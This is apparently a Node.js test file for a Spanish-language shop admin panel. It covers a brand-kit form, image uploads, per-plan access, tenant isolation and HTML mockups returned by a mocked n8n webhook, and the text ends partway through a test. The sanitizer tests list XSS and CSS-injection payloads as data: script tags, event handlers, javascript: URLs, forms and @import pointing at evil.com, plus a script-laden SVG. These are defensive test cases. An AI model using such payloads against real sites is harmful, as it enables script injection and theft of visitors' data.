// Kit de marca y maquetas web del plan Acompañado: el panel (archivos, colores, datos), el pedido a n8n y la entrega del resultado.
// n8n se reemplaza por un servidor de mentira que guarda lo que le llega, así se ve exactamente qué recibe el flujo real.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import { once } from 'node:events';
import { existsSync, mkdtempSync, readdirSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { abrirBase } from '../src/db.js';
import { crearApp } from '../src/app.js';
import { crearTienda } from '../src/tiendas.js';
import { crearPlan } from '../src/plataforma.js';
import { interpretarHoja } from '../src/importacion/interpretar.js';
import { aplicarImportacion } from '../src/importacion/aplicar.js';
import { leerAjustes } from '../src/diseno.js';
import { NIVELES } from '../src/diseno-por-plan.js';
import { formatearPesos } from '../src/util/formato.js';
import { leerMarca, listarArchivos, nombreParaMostrar, validarMarca, MAX_ARCHIVOS } from '../src/marca.js';
import { limpiarCss, limpiarHtml, hashDeToken, crearToken, MAX_HTML, MAX_POR_DIA, MAX_GUARDADAS } from '../src/maquetas.js';
import { crearNavegador, PNG, otraFoto } from './ayudantes.js';

// ---------- Validación del kit ----------

test('validarMarca: el color principal es obligatorio y los otros solo cuentan si se marca "usar"', () => {
  const ok = validarMarca({ colorPrincipal: '#336699', colorSecundarioPropio: '1', colorSecundario: '#E7E5E4', colorAcento: '#ff0000', rubro: '  Ropa   de mujer ', estilo: 'elegante' });
  assert.deepEqual(ok.errores, {});
  assert.deepEqual(ok.valores, { colorPrincipal: '#336699', colorSecundario: '#e7e5e4', colorAcento: '', rubro: 'Ropa de mujer', estilo: 'elegante', descripcion: '', referencias: '' });

  const mal = validarMarca({ colorPrincipal: 'azul', colorSecundarioPropio: '1', colorSecundario: 'rojo', colorAcentoPropio: '1', estilo: 'inventado' });
  assert.deepEqual(Object.keys(mal.errores).sort(), ['colorAcento', 'colorPrincipal', 'colorSecundario', 'estilo']);
  assert.equal(validarMarca({}).errores.colorPrincipal, 'Elegí un color');
});

test('validarMarca: largos máximos, saltos de línea y caracteres de control', () => {
  const largo = validarMarca({ colorPrincipal: '#000000', rubro: 'x'.repeat(81), descripcion: 'y'.repeat(601), referencias: 'z'.repeat(301) });
  assert.deepEqual(Object.keys(largo.errores).sort(), ['descripcion', 'referencias', 'rubro']);
  const justo = validarMarca({ colorPrincipal: '#000000', rubro: 'x'.repeat(80), descripcion: 'y'.repeat(600), referencias: 'z'.repeat(300) });
  assert.deepEqual(justo.errores, {});

  const limpio = validarMarca({ colorPrincipal: '#000000', rubro: 'Ropa\nde\tmujer\u0000\u2028', descripcion: 'Línea 1\r\n\r\n\r\n\r\nLínea 2\u0007  \n  fin  ', referencias: '' });
  assert.equal(limpio.valores.rubro, 'Ropa de mujer', 'el rubro es de una sola línea');
  assert.equal(limpio.valores.descripcion, 'Línea 1\n\nLínea 2\nfin', 'se conservan los párrafos, sin más de un renglón en blanco ni caracteres de control');
});

test('nombreParaMostrar: sin carpetas, sin basura y con las tildes bien', () => {
  assert.equal(nombreParaMostrar('logo.png'), 'logo.png');
  assert.equal(nombreParaMostrar('C:\\fotos\\..\\logo final.png'), 'logo final.png');
  assert.equal(nombreParaMostrar('/etc/pass\u0000wd'), 'pass wd');
  assert.equal(nombreParaMostrar(Buffer.from('María.png', 'utf8').toString('latin1')), 'María.png', 'multer entrega el nombre como si fuera latin1');
  assert.equal(nombreParaMostrar('María.png'), 'María.png', 'si ya está bien, no se toca');
  assert.equal(nombreParaMostrar(''), 'archivo');
  assert.equal(nombreParaMostrar('a'.repeat(200)).length, 80);
});

// ---------- El HTML que entrega n8n: solo lo permitido ----------

const TEXTO = '<p>Texto suficiente para que la maqueta tenga algo para mostrar</p>';
const limpio = (html) => limpiarHtml(`<!doctype html><html><head></head><body>${TEXTO}${html}</body></html>`);

test('limpiarHtml: scripts, eventos, formularios y frames se van; lo demás queda', () => {
  const casos = [
    ['<script>alert(1)</script>', ['<script', 'alert(1)']],
    ['<SCRIPT SRC="https://evil.com/x.js"></SCRIPT>', ['script', 'evil.com']],
    ['<img src=x onerror=alert(1)>', ['onerror', 'alert']],
    ['<img src="https://a.com/x.png" onload="x()" ONERROR=\'y()\'>', ['onload', 'onerror', 'y()']],
    ['<a href="javascript:alert(1)">x</a>', ['javascript', 'href']],
    ['<a href="&#106;avascript:alert(1)">x</a>', ['avascript', 'href']],
    ['<a href="  JaVaScRiPt:alert(1)">x</a>', ['avascript', 'href']],
    ['<a href="https://evil.com">sale de la maqueta</a>', ['evil.com', 'href']],
    ['<a href="data:text/html,<script>alert(1)</script>">x</a>', ['data:', 'alert']],
    ['<iframe src="https://evil.com"></iframe>', ['iframe', 'evil.com']],
    ['<object data="x.swf"></object><embed src="x.swf"><applet code="x"></applet>', ['object', 'embed', 'applet', 'x.swf']],
    ['<form action="https://evil.com" method="post"><input name="clave"><textarea>x</textarea><select><option>y</option></select><button>Enviar</button></form>', ['form', 'input', 'textarea', 'select', 'evil.com']],
    ['<svg onload="alert(1)" viewBox="0 0 10 10"><script>alert(2)</script><path d="M0 0L10 10"/><foreignObject><div onclick="x()">hola</div></foreignObject></svg>', ['onload', 'script', 'foreignobject', 'alert', 'onclick']],
    ['<noscript><img src="https://evil.com/t.gif"></noscript>', ['noscript', 'evil.com']],
    ['<template><script>alert(1)</script></template>', ['template', 'alert']],
    ['<math><mi xlink:href="javascript:alert(1)">x</mi></math>', ['math', 'javascript']],
    ['<base href="https://evil.com/"><meta http-equiv="refresh" content="0;url=https://evil.com">', ['base', 'refresh', 'evil.com']],
    ['<link rel="stylesheet" href="https://evil.com/x.css"><link rel="import" href="https://evil.com/x.html">', ['evil.com', 'import']],
    ['<div class="a<script>alert(1)</script>">hola</div>', ['<script']],
    ['<scr<script>ipt>alert(1)</scr</script>ipt>', ['<script']],
    ['<!--[if IE]><script>alert(1)</script><![endif]--><!-- <script>alert(2)</script> -->', ['script', 'alert']],
    ['<div style="background:url(javascript:alert(1))">x</div>', ['javascript', 'alert']],
    ['<div style="width:expression(alert(1))">x</div>', ['expression']],
    ['<xmp><script>alert(1)</script></xmp><plaintext><script>alert(2)</script>', ['xmp', 'plaintext', 'alert']],
  ];
  for (const [entrada, prohibido] of casos) {
    const salida = limpio(entrada);
    assert.ok(salida, `quedó algo para mostrar: ${entrada}`);
    for (const texto of prohibido) assert.ok(!salida.toLowerCase().includes(texto.toLowerCase()), `"${texto}" no tiene que quedar en la salida de ${entrada}\n${salida}`);
    assert.ok(salida.includes('Texto suficiente'), 'el contenido normal sigue');
  }
});

test('limpiarHtml: lo normal de una maqueta pasa tal cual', () => {
  const entrada =
    '<!doctype html><html lang="es"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Casa Demo</title>' +
    '<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap">' +
    '<style>:root{--c:#336699} body{font-family:Inter,sans-serif;background:var(--c)} .hero{background:url(/subidas/1/foto.webp) center/cover} @media (max-width:600px){.hero{padding:1rem}}</style></head>' +
    '<body class="inicio"><header id="top"><nav aria-label="Principal"><a href="#productos">Productos</a></nav></header>' +
    '<section class="hero" style="padding:2rem;color:#fff"><h1>Casa Demo</h1><img src="https://panel.ejemplo.com/subidas/1/logo.webp" alt="Logo de Casa Demo" width="120" loading="lazy"></section>' +
    '<svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true"><path d="M3 3h18v18H3z" fill="none" stroke="currentColor" stroke-width="2"/></svg>' +
    '<table><tbody><tr><td colspan="2">Dato</td></tr></tbody></table><button>Comprar</button></body></html>';
  const salida = limpiarHtml(entrada);
  for (const esperado of [
    '<!doctype html>', '<html lang="es">', '<meta charset="utf-8">', '<meta name="viewport" content="width=device-width, initial-scale=1">', '<title>Casa Demo</title>',
    '<link rel="preconnect" href="https://fonts.googleapis.com">', 'href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&amp;display=swap"',
    'body{font-family:Inter,sans-serif;background:var(--c)}', 'url("/subidas/1/foto.webp")', '@media (max-width:600px)',
    '<body class="inicio">', '<nav aria-label="Principal">', '<a href="#productos">Productos</a>', 'style="padding:2rem;color:#fff"',
    '<img src="https://panel.ejemplo.com/subidas/1/logo.webp" alt="Logo de Casa Demo" width="120" loading="lazy">',
    '<svg viewbox="0 0 24 24" width="20" height="20" aria-hidden="true">', '<path d="M3 3h18v18H3z" fill="none" stroke="currentColor" stroke-width="2"/>',
    '<td colspan="2">Dato</td>', '<button>Comprar</button>',
  ]) {
    assert.ok(salida.includes(esperado), `falta ${esperado}\n${salida}`);
  }
});

test('limpiarHtml: siempre devuelve un documento completo; con muy poco o demasiado, null', () => {
  const fragmento = limpiarHtml('<h1>Solo un fragmento con bastante texto</h1><p>y otro párrafo</p>');
  assert.match(fragmento, /^<!doctype html><html lang="es"><head><meta charset="utf-8"><meta name="viewport"[^>]*><\/head><body><h1>/);
  const sinMetas = limpiarHtml('<html><body><p>Un documento sin cabecera, pero con texto de sobra</p></body></html>');
  assert.match(sinMetas, /^<!doctype html><html><head><meta charset="utf-8"><meta name="viewport"[^>]*><\/head><body>/);
  const otroCharset = limpiarHtml('<!doctype html><html><head><meta charset="iso-8859-1"></head><body><p>Un documento con otro juego de caracteres declarado</p></body></html>');
  assert.ok(otroCharset.includes('<meta charset="utf-8">') && !otroCharset.includes('iso-8859-1'));

  for (const nada of [null, undefined, 42, '', '<body></body>', '<script>alert(1)</script>', '<p>poco</p>']) assert.equal(limpiarHtml(nada), null, `${nada} no es una maqueta`);
  assert.equal(limpiarHtml(`<p>${'x'.repeat(MAX_HTML)}</p>`), null, 'demasiado grande');
  assert.ok(limpiarHtml('<img src="https://a.com/x.png">'), 'una maqueta que es solo una imagen sí se muestra');
});

test('limpiarHtml: lo que no se entiende se escapa y no abre etiquetas; las comillas sin cerrar no la traban', () => {
  const salida = limpio('<p>1 < 2 y a < b y "comillas" &amp; &lt;script&gt;</p><img alt="un \'texto\' con <b>etiquetas</b> y \"comillas\"">');
  assert.ok(salida.includes('1 &lt; 2'), 'el < suelto se escapa');
  assert.ok(salida.includes('&amp; &lt;script&gt;'), 'las entidades que ya venían se respetan');
  assert.ok(!/<script/i.test(salida));
  const feo = ['<a "'.repeat(40_000), '<div '.repeat(40_000), '<!--'.repeat(50_000), "<p class='a' ".repeat(15_000), '<style></style>'.repeat(15_000), '<'.repeat(100_000)];
  const inicio = Date.now();
  for (const texto of feo) limpiarHtml(`<p>Texto suficiente para pasar el mínimo</p>${texto}`);
  assert.ok(Date.now() - inicio < 3000, `el HTML mal formado no la traba (${Date.now() - inicio} ms)`);
});

test('limpiarCss: solo imágenes permitidas, sin @import ni escapes, y descarta todo si hay algo raro', () => {
  assert.equal(limpiarCss('a{color:red} /* nota */ b{background:url("/subidas/1/a.webp")}'), 'a{color:red}  b{background:url("/subidas/1/a.webp")}');
  assert.equal(limpiarCss('a{background:url(https://panel.ejemplo.com/subidas/1/a.webp)}'), 'a{background:url("https://panel.ejemplo.com/subidas/1/a.webp")}');
  for (const malo of [
    '@import url(https://evil.com/x.css);', 'a{background:url(javascript:alert(1))}', 'a{background:url(//evil.com/x.png)}', 'a{background:url(data:text/html,x)}',
    'a{width:expression(alert(1))}', 'a{behavior:url(x.htc)}', 'a{-moz-binding:url(x)}', 'a{background:u\\72l(https://evil.com/x)}', 'a{b:image-set("https://evil.com/x.png" 1x)}',
    'a{b:src("https://evil.com/x.png")}', '@font-face{font-family:x;src:url(https://evil.com/f.woff)}', 'a{content:"</style><script>"} </style>', 'a{b:c}<!--',
  ]) {
    assert.equal(limpiarCss(malo), '', `se descarta: ${malo}`);
  }
  assert.equal(limpiarCss('a::before{content:"\\201C"}'), 'a::before{content:"\\201C"}', 'un escape dentro de un texto es normal');
});

test('el token del pedido: al azar y solo se guarda su huella', () => {
  const [a, b] = [crearToken(), crearToken()];
  assert.notEqual(a, b);
  assert.match(a, /^[A-Za-z0-9_-]{43}$/);
  assert.match(hashDeToken(a), /^[0-9a-f]{64}$/);
  assert.equal(hashDeToken(a), hashDeToken(a));
  assert.notEqual(hashDeToken(a), hashDeToken(b));
});

// ---------- Con la aplicación andando ----------

let db;
let servidor;
let n8n;
let puerto;
let dirSubidas;
let contador = 0;
// Lo que le llegó al n8n de mentira, y qué contesta.
const recibidos = [];
let respuestaN8n = 200;

before(async () => {
  dirSubidas = mkdtempSync(path.join(tmpdir(), 'marca-'));
  n8n = http.createServer((req, res) => {
    let cuerpo = '';
    req.on('data', (parte) => (cuerpo += parte));
    req.on('end', () => {
      recibidos.push({ headers: req.headers, cuerpo: JSON.parse(cuerpo || '{}') });
      res.writeHead(respuestaN8n, { 'content-type': 'application/json' }).end('{"recibido":true}');
    });
  });
  n8n.listen(0);
  await once(n8n, 'listening');
  db = await abrirBase(':memory:');
  const config = {
    produccion: false,
    secretoSesion: 'secreto-de-prueba-de-al-menos-32-caracteres',
    dominio: 'localhost',
    dirImportaciones: '.',
    dirSubidas,
    contactoPlataforma: 'info@ejemplo.com',
    maquetas: { url: `http://127.0.0.1:${n8n.address().port}/webhook/maquetas`, secreto: 'secreto-de-n8n' },
  };
  servidor = crearApp({ db, config }).listen(0);
  await once(servidor, 'listening');
  puerto = servidor.address().port;
});

after(() => {
  servidor?.closeAllConnections();
  servidor?.close();
  n8n?.closeAllConnections();
  n8n?.close();
  rmSync(dirSubidas, { recursive: true, force: true });
});

// Una tienda con productos en un plan del nivel dado, ya con la sesión iniciada.
async function tienda(nivel = 'acompanado', puertoApp = puerto) {
  contador++;
  const slug = `marca-${contador}`;
  const { tienda: creada, clave } = await crearTienda(db, { nombre: `Casa ${contador}`, email: `${slug}@ejemplo.com`, slug });
  if (nivel) {
    const planId = await crearPlan(db, { nombre: `Plan ${nivel} ${contador}`, precioCentavos: 1000, maxProductos: null, maxFotos: null, maxBanners: null, activo: true, nivelDiseno: nivel });
    await db.prepare('UPDATE tiendas SET plan_id = ? WHERE id = ?').run(planId, creada.id);
  }
  const { productos } = interpretarHoja([['SKU', 'Nombre', 'Precio', 'Stock'], [`TAZA${contador}`, 'Taza', 1500, 10], [`MATE${contador}`, 'Mate', 2500, 10]]);
  await aplicarImportacion(db, creada.id, productos);
  const nav = crearNavegador(`http://127.0.0.1:${puertoApp}`);
  assert.equal((await nav.enviar('/admin/ingresar', { email: `${slug}@ejemplo.com`, clave })).status, 302);
  return { nav, tiendaId: creada.id, slug };
}

const pagina = async (t, ruta) => (await t.nav.pedir(ruta)).text();
// Sube imágenes al kit. archivos: [{ contenido, nombre }].
const subir = (t, archivos, tipo = 'foto') => t.nav.enviarArchivos('/admin/marca/archivos', { tipo, archivos }, { desde: '/admin/marca' });
const imagen = (n, nombre = `foto-${n}.png`) => ({ contenido: otraFoto(n), nombre });
const guardarKit = (t, campos) => t.nav.enviar('/admin/marca', { colorPrincipal: '#336699', ...campos }, { desde: '/admin/marca' });
const pedirMaqueta = (t) => t.nav.enviar('/admin/marca/maqueta', {}, { desde: '/admin/marca' });
const entregar = (id, cuerpo) =>
  fetch(`http://127.0.0.1:${puerto}/webhooks/maquetas/${id}`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: typeof cuerpo === 'string' ? cuerpo : JSON.stringify(cuerpo) });
const HTML_OK = `<!doctype html><html><head><meta charset="utf-8"><title>Maqueta</title><style>body{font-family:sans-serif}</style></head><body><h1>Casa de ejemplo</h1><p>Una tienda con mucho para ver y comprar</p></body></html>`;
const maquetaDe = (t) => db.prepare('SELECT * FROM maquetas WHERE tienda_id = ? ORDER BY id DESC LIMIT 1').get(t.tiendaId);
// Pide una maqueta y devuelve lo que le llegó a n8n (el id y el token).
async function pedida(t) {
  const antes = recibidos.length;
  assert.equal((await pedirMaqueta(t)).status, 302);
  assert.equal(recibidos.length, antes + 1, 'le llegó el aviso a n8n');
  return recibidos.at(-1).cuerpo.maqueta;
}

test('un plan Esencial ve el kit bloqueado y no puede guardar, subir ni pedir nada aunque arme los pedidos a mano', async () => {
  const t = await tienda('esencial');
  const html = await pagina(t, '/admin/marca');
  assert.ok(html.includes('Disponible desde el plan <strong>Acompañado</strong>') && html.includes('Tu plan incluye el diseño Esencial'));
  assert.ok(!html.includes('name="archivos"') && !html.includes('id="form-marca"'), 'no hay formularios');
  assert.ok((await pagina(t, '/admin/marca/maqueta')).includes('Disponible desde el plan <strong>Acompañado</strong>'));

  // Los formularios no están, pero el pedido se puede armar a mano: no pasa nada. Hace falta un token de la sesión: se saca del Diseño.
  const csrf = await t.nav.csrfDe('/admin/diseno');
  const antes = recibidos.length;
  assert.equal((await t.nav.pedir('/admin/marca', { method: 'POST', body: new URLSearchParams({ _csrf: csrf, colorPrincipal: '#ff0000' }) })).status, 302);
  assert.equal((await t.nav.pedir('/admin/marca/maqueta', { method: 'POST', body: new URLSearchParams({ _csrf: csrf }) })).status, 302);
  const formulario = new FormData();
  formulario.set('_csrf', csrf);
  formulario.set('tipo', 'foto');
  formulario.append('archivos', new Blob([PNG]), 'x.png');
  assert.equal((await t.nav.pedir('/admin/marca/archivos', { method: 'POST', body: formulario })).status, 302);

  assert.equal((await db.prepare('SELECT count(*) AS n FROM marca WHERE tienda_id = ?').get(t.tiendaId)).n, 0);
  assert.equal((await db.prepare('SELECT count(*) AS n FROM marca_archivos WHERE tienda_id = ?').get(t.tiendaId)).n, 0);
  assert.equal((await db.prepare('SELECT count(*) AS n FROM maquetas WHERE tienda_id = ?').get(t.tiendaId)).n, 0);
  assert.equal(recibidos.length, antes, 'a n8n no le llegó nada');
  assert.ok((await pagina(t, '/admin/marca')).includes('Disponible desde el plan <strong>Acompañado</strong>'), 'el aviso lo dice');
});

test('Diseño muestra la card del kit de marca en todos los planes, y la lista de lo que incluye Acompañado la nombra', async () => {
  const esencial = await pagina(await tienda('esencial'), '/admin/diseno');
  assert.ok(esencial.includes('href="/admin/marca">Kit de marca y maqueta web</a>') && esencial.includes('Ver qué incluye'));
  const acompanado = await pagina(await tienda('acompanado'), '/admin/diseno');
  assert.ok(acompanado.includes('href="/admin/marca">Kit de marca y maqueta web</a>') && acompanado.includes('Armar mi maqueta'));
  assert.ok(NIVELES.acompanado.incluye.some((linea) => linea.startsWith('Kit de marca')));
  assert.ok(!NIVELES.esencial.incluye.some((linea) => linea.includes('Kit de marca')));
});

test('el kit: se guarda, vuelve a mostrarse y los datos mal puestos no pisan lo guardado', async () => {
  const t = await tienda();
  let html = await pagina(t, '/admin/marca');
  assert.ok(html.includes('id="form-marca"') && html.includes('name="colorPrincipal"') && html.includes('name="estilo"'));
  // Sin nada guardado, el color principal es el de la tienda.
  assert.ok(html.includes(`name="colorPrincipal" value="${(await leerAjustes(db, t.tiendaId)).colorPrincipal}"`));

  const respuesta = await guardarKit(t, {
    colorSecundarioPropio: '1', colorSecundario: '#E7E5E4', colorAcento: '#ff0000', rubro: 'Cosmética natural', estilo: 'calido',
    descripcion: 'Hacemos jabones y cremas\ncon ingredientes locales.', referencias: 'Rituals, Lush',
  });
  assert.equal(respuesta.status, 302);
  assert.deepEqual(await leerMarca(db, t.tiendaId), {
    colorPrincipal: '#336699', colorSecundario: '#e7e5e4', colorAcento: '', rubro: 'Cosmética natural', estilo: 'calido',
    descripcion: 'Hacemos jabones y cremas\ncon ingredientes locales.', referencias: 'Rituals, Lush',
  });
  html = await pagina(t, '/admin/marca');
  assert.ok(html.includes('Listo, guardamos tu kit de marca.'));
  assert.ok(html.includes('name="colorPrincipal" value="#336699"') && html.includes('name="colorSecundarioPropio" value="1" checked'));
  assert.ok(!html.includes('name="colorAcentoPropio" value="1" checked'), 'el acento no se marcó');
  assert.ok(html.includes('name="estilo" value="calido" checked') && html.includes('>Hacemos jabones y cremas\ncon ingredientes locales.</textarea>'));

  // Con errores no se guarda nada (ni lo que estaba bien) y el formulario vuelve con lo que se escribió.
  const mala = await guardarKit(t, { colorPrincipal: 'azul', rubro: 'Otro rubro', estilo: 'inventado', descripcion: 'x'.repeat(601) });
  assert.equal(mala.status, 400);
  const textoMalo = await mala.text();
  assert.ok(textoMalo.includes('Elegí un color') && textoMalo.includes('Máximo 600 caracteres') && textoMalo.includes('Elegí una de las opciones'));
  assert.ok(textoMalo.includes('value="Otro rubro"'), 'conserva lo escrito');
  assert.equal((await leerMarca(db, t.tiendaId)).rubro, 'Cosmética natural');

  // Un texto con HTML se muestra como texto.
  await guardarKit(t, { rubro: '<script>alert(1)</script>', descripcion: '"><img src=x onerror=alert(1)>' });
  html = await pagina(t, '/admin/marca');
  assert.ok(!html.includes('<script>alert(1)') && !html.includes('<img src=x onerror') && html.includes('&lt;script&gt;alert(1)&lt;/script&gt;'));
});

test('subir archivos: convierte a WebP con miniaturas, los muestra, y borrar quita la fila y los archivos', async () => {
  const t = await tienda();
  const respuesta = await subir(t, [imagen(1, 'Logo María.png'), imagen(2)], 'logo');
  assert.equal(respuesta.status, 302);
  const archivos = await listarArchivos(db, t.tiendaId);
  assert.equal(archivos.length, 2);
  assert.deepEqual(archivos.map((a) => [a.tipo, a.nombre]), [['logo', 'Logo María.png'], ['logo', 'foto-2.png']]);
  const carpeta = path.join(dirSubidas, String(t.tiendaId));
  const enDisco = readdirSync(carpeta);
  assert.equal(enDisco.length, 6, 'cada imagen: la grande y dos miniaturas');
  for (const a of archivos) {
    assert.match(a.archivo, /^[0-9a-f-]{36}\.webp$/);
    assert.ok(a.url.startsWith(`/subidas/${t.tiendaId}/`) && a.miniatura.endsWith('-m.webp'));
    assert.equal((await t.nav.pedir(a.miniatura)).status, 200, 'la miniatura se sirve');
  }
  const html = await pagina(t, '/admin/marca');
  assert.ok(html.includes('Subimos 2 imágenes.') && html.includes('Logo María.png') && html.includes('<strong>2</strong> de 12 archivos'));

  const primera = archivos[0];
  const borrado = await t.nav.enviar(`/admin/marca/archivos/${primera.id}/borrar`, {}, { desde: '/admin/marca' });
  assert.equal(borrado.status, 302);
  assert.equal((await listarArchivos(db, t.tiendaId)).length, 1);
  assert.equal(readdirSync(carpeta).length, 3, 'se borraron la imagen y sus miniaturas');
  assert.ok(!existsSync(path.join(carpeta, primera.archivo)));
  // Borrar algo que ya no está avisa sin romper.
  await t.nav.enviar(`/admin/marca/archivos/${primera.id}/borrar`, {}, { desde: '/admin/marca' });
  assert.ok((await pagina(t, '/admin/marca')).includes('Ese archivo ya no está en tu kit.'));
});

test('subir archivos: lo que no es una imagen válida se rechaza con su nombre, y las buenas del mismo envío entran igual', async () => {
  const t = await tienda();
  const svg = { contenido: Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'), nombre: 'logo.svg' };
  const texto = { contenido: Buffer.from('no soy una imagen'), nombre: 'notas.png' };
  const respuesta = await subir(t, [svg, imagen(3), texto]);
  assert.equal(respuesta.status, 302);
  assert.equal((await listarArchivos(db, t.tiendaId)).length, 1, 'solo entró la buena');
  const html = await pagina(t, '/admin/marca');
  assert.ok(html.includes('Subimos 1 imagen.') && html.includes('logo.svg: La imagen tiene que ser JPG, PNG o WEBP.') && html.includes('notas.png:'));

  // Solo malas: error y nada guardado. Sin tipo o sin archivos: también.
  await subir(t, [svg]);
  assert.ok((await pagina(t, '/admin/marca')).includes('logo.svg: La imagen tiene que ser JPG, PNG o WEBP.'));
  await t.nav.enviarArchivos('/admin/marca/archivos', { tipo: 'cualquiera', archivos: [imagen(4)] }, { desde: '/admin/marca' });
  assert.ok((await pagina(t, '/admin/marca')).includes('Elegí si lo que subís es un logo o una foto.'));
  await t.nav.enviarArchivos('/admin/marca/archivos', { tipo: 'foto' }, { desde: '/admin/marca' });
  assert.ok((await pagina(t, '/admin/marca')).includes('Elegí al menos una imagen.'));
  assert.equal((await listarArchivos(db, t.tiendaId)).length, 1);
});

test('subir archivos: tope de peso, de archivos por envío y de archivos en total', async () => {
  const t = await tienda();
  // Una imagen de más de 5 MB.
  const pesada = { contenido: Buffer.concat([PNG, Buffer.alloc(5 * 1024 * 1024 + 10)]), nombre: 'enorme.png' };
  assert.equal((await subir(t, [pesada])).status, 302);
  assert.ok((await pagina(t, '/admin/marca')).includes('Una de las imágenes pesa más de 5 MB.'));
  // Más de 6 de una vez.
  assert.equal((await subir(t, Array.from({ length: 7 }, (_, n) => imagen(10 + n)))).status, 302);
  assert.ok((await pagina(t, '/admin/marca')).includes('Podés subir hasta 6 imágenes por vez.'));
  assert.equal((await listarArchivos(db, t.tiendaId)).length, 0, 'no entró ninguna');

  // 12 en total: dos envíos de 6 llenan el kit; con uno más ya no entra y no queda el archivo suelto en el disco.
  await subir(t, Array.from({ length: 6 }, (_, n) => imagen(20 + n)));
  await subir(t, Array.from({ length: 6 }, (_, n) => imagen(30 + n)));
  assert.equal((await listarArchivos(db, t.tiendaId)).length, MAX_ARCHIVOS);
  const html = await pagina(t, '/admin/marca');
  assert.ok(html.includes('Llegaste al máximo de 12 archivos') && !html.includes('name="archivos"'), 'el formulario de subida desaparece');
  const carpeta = path.join(dirSubidas, String(t.tiendaId));
  const antes = readdirSync(carpeta).length;
  await subir(t, [imagen(40)]);
  assert.equal((await listarArchivos(db, t.tiendaId)).length, MAX_ARCHIVOS);
  assert.equal(readdirSync(carpeta).length, antes, 'la que no entró no quedó en el disco');
  assert.ok((await pagina(t, '/admin/marca')).includes('1 imagen no entró'));
});

test('dos subidas a la vez no pasan del tope', async () => {
  const t = await tienda();
  await subir(t, Array.from({ length: 6 }, (_, n) => imagen(50 + n)));
  await subir(t, Array.from({ length: 4 }, (_, n) => imagen(60 + n)));
  assert.equal((await listarArchivos(db, t.tiendaId)).length, 10);
  await Promise.all([subir(t, [imagen(70), imagen(71)]), subir(t, [imagen(72), imagen(73)])]);
  assert.equal((await listarArchivos(db, t.tiendaId)).length, MAX_ARCHIVOS, 'quedó justo en el tope');
  assert.equal(readdirSync(path.join(dirSubidas, String(t.tiendaId))).length, MAX_ARCHIVOS * 3, 'sin archivos de más en el disco');
});

test('cada tienda ve y borra solo lo suyo', async () => {
  const a = await tienda();
  const b = await tienda();
  await subir(a, [imagen(80, 'de-a.png')]);
  const [archivoDeA] = await listarArchivos(db, a.tiendaId);
  await subir(b, [imagen(81, 'de-b.png')]);
  assert.ok(!(await pagina(b, '/admin/marca')).includes('de-a.png'));
  await b.nav.enviar(`/admin/marca/archivos/${archivoDeA.id}/borrar`, {}, { desde: '/admin/marca' });
  assert.equal((await listarArchivos(db, a.tiendaId)).length, 1, 'b no pudo borrar el archivo de a');
  assert.ok(existsSync(path.join(dirSubidas, String(a.tiendaId), archivoDeA.archivo)));

  // Ni ver, ni borrar, ni consultar las maquetas de otra tienda.
  await subir(a, [imagen(82)]);
  const { id, token } = await pedida(a);
  await entregar(id, { token, estado: 'lista', html: HTML_OK });
  for (const ruta of [`/admin/marca/maqueta/${id}/vista`, `/admin/marca/maqueta/${id}/estado`]) assert.equal((await b.nav.pedir(ruta)).status, 404, ruta);
  assert.ok(!(await pagina(b, `/admin/marca/maqueta?ver=${id}`)).includes('maqueta-iframe'));
  await b.nav.enviar(`/admin/marca/maqueta/${id}/borrar`, {}, { desde: '/admin/marca' });
  assert.equal((await maquetaDe(a)).estado, 'lista', 'b no pudo borrar la maqueta de a');
});

test('pedir la maqueta: sin material no se puede; con él, n8n recibe todo lo que necesita', async () => {
  const t = await tienda();
  assert.ok((await pagina(t, '/admin/marca')).includes('Subí al menos un logo o una foto para poder armar la maqueta.'));
  const antes = recibidos.length;
  await pedirMaqueta(t);
  assert.equal(recibidos.length, antes, 'sin logo ni fotos no se le avisa a n8n');
  assert.equal((await maquetaDe(t)), undefined);

  // Con las fotos de un producto, para ver que el catálogo viaja con ellas.
  await db.prepare('UPDATE productos SET destacado = 1 WHERE tienda_id = ? AND nombre = ?').run(t.tiendaId, 'Taza');
  const { id: productoId } = await db.prepare("SELECT id FROM productos WHERE tienda_id = ? AND nombre = 'Taza'").get(t.tiendaId);
  await db.prepare('INSERT INTO producto_fotos (tienda_id, producto_id, archivo, orden) VALUES (?, ?, ?, 1)').run(t.tiendaId, productoId, 'foto-de-la-taza.webp');
  await subir(t, [imagen(90, 'Logo.png')], 'logo');
  await subir(t, [imagen(91, 'Local.png')], 'foto');
  await guardarKit(t, { colorSecundarioPropio: '1', colorSecundario: '#e7e5e4', rubro: 'Casa y deco', estilo: 'moderno', descripcion: 'Objetos para el hogar', referencias: 'IKEA' });

  const respuesta = await pedirMaqueta(t);
  assert.equal(respuesta.status, 302);
  assert.equal(respuesta.headers.get('location'), '/admin/marca/maqueta');
  assert.equal(recibidos.length, antes + 1);
  const { headers, cuerpo } = recibidos.at(-1);
  assert.equal(headers['x-webhook-secret'], 'secreto-de-n8n');
  assert.equal(cuerpo.evento, 'maqueta_solicitada');
  const base = `http://localhost:${puerto}`;
  assert.match(cuerpo.maqueta.token, /^[A-Za-z0-9_-]{43}$/);
  assert.equal(cuerpo.maqueta.respuesta, `${base}/webhooks/maquetas/${cuerpo.maqueta.id}`);
  assert.equal(cuerpo.tienda.nombre, `Casa ${contador}`);
  assert.ok(cuerpo.tienda.url.startsWith('http://') && cuerpo.tienda.url.includes(t.slug));
  assert.deepEqual(cuerpo.marca, {
    colores: { principal: '#336699', secundario: '#e7e5e4', acento: null },
    rubro: 'Casa y deco', estilo: 'moderno', descripcion: 'Objetos para el hogar', referencias: 'IKEA',
  });
  assert.deepEqual(cuerpo.archivos.map((a) => [a.tipo, a.nombre]), [['logo', 'Logo.png'], ['foto', 'Local.png']]);
  for (const a of cuerpo.archivos) {
    assert.ok(a.url.startsWith(`${base}/subidas/${t.tiendaId}/`) && a.url.endsWith('.webp'), 'links absolutos que n8n puede abrir');
